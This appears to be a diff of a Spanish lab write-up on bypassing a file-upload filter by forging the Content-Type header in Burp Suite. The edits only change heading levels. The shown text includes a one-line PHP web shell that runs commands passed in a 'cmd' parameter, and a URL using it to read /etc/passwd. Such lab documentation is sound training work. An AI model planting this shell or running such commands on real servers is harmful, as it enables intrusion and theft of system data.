@@ -15,7 +15,7 @@ Práctica realizada en un entorno controlado con **Kali Linux** y **VirtualBox**
 #### Identificación de la debilidad
 La validación se realiza únicamente en el lado del servidor revisando la cabecera Content-Type de la petición HTTP. Como esta cabecera es enviada por el cliente, puede ser interceptada y modificada antes de que llegue al servidor.
 
-#### Validación del Ataque (Paso a Paso)
+### Validación del Ataque (Paso a Paso)
 Para saltar esta restricción, hemos utilizado herramientas de interceptación (como **Burp Suite** o las herramientas de desarrollador del navegador):
 * **Creación del Payload:** Se creó un archivo llamado shell.php con el siguiente contenido para ejecutar comandos:
 `<?php echo shell_exec($_GET['cmd']); ?>`
@@ -60,7 +60,7 @@ Tras esto envíamos la petición modificada.
 |----------------|------------|----------------------|-----------------------|
 | shell.php      | PHP Script | image/jpeg           | Éxito (Uploaded)      |
 
-#### Extracción de Información Crítica
+## Extracción de Información Crítica
 Una vez subida la shell, accedemos a la ruta del archivo y ejecutamos comandos mediante el parámetro `cmd`:
 * **Lectura de usuarios:** `.../uploads/shell.php?cmd=cat /etc/passwd`
 <img width="1048" height="538" alt="image" src="https://github.com/user-attachments/assets/a577b28e-1c06-4155-ba82-e1e6dc9093fc" />
